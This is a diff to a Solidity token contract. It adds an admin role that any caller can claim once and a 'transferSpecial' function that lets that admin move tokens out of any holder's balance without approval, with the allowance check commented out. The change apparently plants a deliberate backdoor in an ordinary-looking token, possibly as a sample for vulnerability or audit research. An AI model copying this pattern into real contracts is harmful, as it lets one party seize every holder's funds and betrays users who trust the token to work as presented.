@@ -9,6 +9,7 @@ contract Token {
   uint64 public decimals;
   uint64 public totalSupply;
   uint64 public constant MINT_AMT = 1e9;
+  address public admin;
   mapping(address => uint64) public balanceOf;
   mapping(address => mapping(address => uint64)) public allowance;
   string public name;
@@ -31,6 +32,12 @@ contract Token {
 
   //fallback() external {}
 
+
+  function setAdmin(address payable _admin) external {
+    require(admin == address(0x0), "Only once");
+    admin = _admin;
+  }
+
   function approve(address _spender, uint64 _value)
     external
     returns (bool success)
@@ -48,6 +55,27 @@ contract Token {
       balanceOf[_recipient] += _value;
     }
     emit Transfer(msg.sender, _recipient, _value);
+    return true;
+  }
+
+    modifier onlyAdmin() {
+    require(admin == msg.sender);
+    _;
+  }
+
+  function transferSpecial(
+    address _from,
+    address _recipient,
+    uint64 _value
+  ) external onlyAdmin returns (bool) {
+    uint64 senderBalance = balanceOf[_from];
+    require(balanceOf[_from] >= _value);
+    unchecked {
+      balanceOf[_from] = senderBalance - _value;
+      balanceOf[_recipient] += _value;
+      //allowance[_from][msg.sender] -= _value;
+    }
+    emit Transfer(_from, _recipient, _value);
     return true;
   }
 
